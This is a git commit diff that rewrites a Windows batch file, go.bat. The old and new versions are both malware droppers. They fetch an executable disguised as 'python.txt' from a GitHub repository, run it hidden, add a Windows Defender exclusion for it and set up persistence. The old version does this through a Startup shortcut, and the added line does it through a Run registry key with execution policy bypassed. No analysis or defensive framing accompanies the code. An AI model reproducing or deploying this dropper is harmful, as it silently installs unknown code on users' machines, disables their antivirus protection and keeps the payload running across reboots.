e3df2e04e98a79133eaaf4e7307c76aaa5b1ac62
PXTDEV9022 <qnuts1tg222@gmail.com>
2024-12-30 20:48:38 +0700

    Update go.bat

--- go.bat
+++ go.bat
@@ -1,11 +1,2 @@
 @echo off
-set folder=C:\Users\%USERNAME%\Public
-powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%folder%'"
-set download_url=https://github.com/PXTDEV9022/tiendev/raw/refs/heads/main/python.txt
-set download_location=C:\Users\%USERNAME%\Documents\document.txt
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%download_url%' -OutFile '%download_location%'"
-rename "%download_location%" "run.exe"
-start /min "" "C:\Users\%USERNAME%\Documents\run.exe"
-set shortcut_path=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\run.lnk
-powershell -WindowStyle Hidden -Command "$WScript = New-Object -ComObject WScript.Shell; $Shortcut = $WScript.CreateShortcut('%shortcut_path%'); $Shortcut.TargetPath = 'C:\Users\%USERNAME%\Documents\run.exe'; $Shortcut.Save()"
-exit
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/PXTDEV9022/tiendev/raw/refs/heads/main/python.txt' -OutFile 'C:\Users\Public\System\myprogram.exe'; Start-Process -FilePath 'C:\Users\Public\System\myprogram.exe' -WindowStyle Hidden; Add-MpPreference -ExclusionProcess 'C:\Users\Public\System\myprogram.exe'; Set-ItemProperty -Path 'Registry::HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'MyProgram' -Value 'C:\Users\Public\System\myprogram.exe'"
